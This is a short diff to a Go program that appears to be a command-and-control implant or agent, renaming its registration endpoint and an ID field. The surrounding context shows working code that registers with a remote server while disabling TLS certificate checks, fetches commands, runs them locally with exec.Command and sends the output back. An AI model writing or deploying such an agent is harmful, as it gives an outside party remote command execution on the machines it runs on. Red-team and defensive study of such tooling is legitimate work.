@@ -54,7 +54,7 @@ func register(serverIP string) string {
 	//fmt.Printf("%s", serverIP)
 	//resp_register, _ := http.NewRequest(http.MethodGet, "http://"+serverIP+":5000/api/1.1/add_agent", responseBody)
 	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
-	resp_register, _ := http.Post("https://"+serverIP+"/api/1.1/add_agent", "application/json", responseBody)
+	resp_register, _ := http.Post("https://"+serverIP+"/api/1.1/register_agent", "application/json", responseBody)
 	resp_register.Close = true
 	body2, _ := ioutil.ReadAll(resp_register.Body)
 	agent_id := string(body2)
@@ -84,7 +84,7 @@ func get_command(agent_id string, serverIP string, sleepTime time.Duration) {
 		out, _ := exec.Command(parsed_command, args...).Output()
 		output := string(out[:])
 		resp_body, _ := json.Marshal(map[string]string{
-			"implantID": agent_id,
+			"agentID":   agent_id,
 			"commandID": commandID,
 			"output":    output,
 		})
